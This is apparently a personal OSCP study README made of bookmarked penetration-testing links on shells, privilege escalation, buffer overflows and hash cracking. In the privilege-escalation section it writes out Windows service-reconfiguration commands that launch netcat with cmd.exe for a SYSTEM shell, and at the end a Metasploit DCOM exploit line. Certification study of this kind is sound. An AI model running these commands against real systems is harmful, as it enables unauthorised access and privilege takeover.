# OSCP
** This repo consists of important links (or URLs) which were bookmarked during my journey of OSCP Certification **

!! Note !!

** Most of my links were SPOLIERS :P !!!**
                                            

#Reverse and Bind Shell tutorials

https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/

http://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

# Different Types of Shells (Like Php, bash, netcat ....)

https://highon.coffee/blog/reverse-shell-cheat-sheet/

# Privilege Escalation 

http://www.fuzzysecurity.com/tutorials/16.html

  sc qc upnphost
  sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
  sc config upnphost obj= ".\LocalSystem" password= ""
  sc qc upnphost
  net start upnphost
  
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
 
#Buffer Overflow 

 #For Practicing
http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/

# MD5 Decrypter 
https://hashkiller.co.uk/md5-decrypter.aspx

# Port 135
https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploit-and-gain-remote-access-pcs-running-windows-xp-0134709/
  
  > use exploit/windows/dcerpc/ms03_026_dcom
